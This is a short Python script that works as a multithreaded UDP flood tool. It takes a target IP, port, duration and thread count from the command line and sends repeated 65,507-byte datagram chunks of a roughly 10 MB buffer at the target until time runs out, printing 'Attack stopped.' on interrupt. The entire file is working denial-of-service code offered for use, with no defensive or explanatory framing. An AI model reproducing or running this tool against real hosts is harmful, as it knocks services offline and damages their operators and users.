import socket
import sys
import threading
from time import time as tt

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
threads = int(sys.argv[4])

def attack(ip, port, time):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    startup = tt()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65508)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)
    data = bytearray(9999999)
    data[0] = 255
    data[1] = 0x00
    data[2] = 0xFF
    data[3] = 0x7F
    data[4] = 0x78
    data[5] = 0x1B
    MAX_DATAGRAM_SIZE = 65507
    chunks = [data[i:i+MAX_DATAGRAM_SIZE] for i in range(0, len(data), MAX_DATAGRAM_SIZE)]
    addr = (str(ip),int(port))
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        for chunk in chunks:
            s.sendto(chunk, addr)

if __name__ == '__main__':
    try:
        threads_list = []
        for i in range(int(threads)):
            thread = threading.Thread(target=attack, args=(ip, port, time))
            thread.start()
            threads_list.append(thread)

        for thread in threads_list:
            thread.join()
            
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")
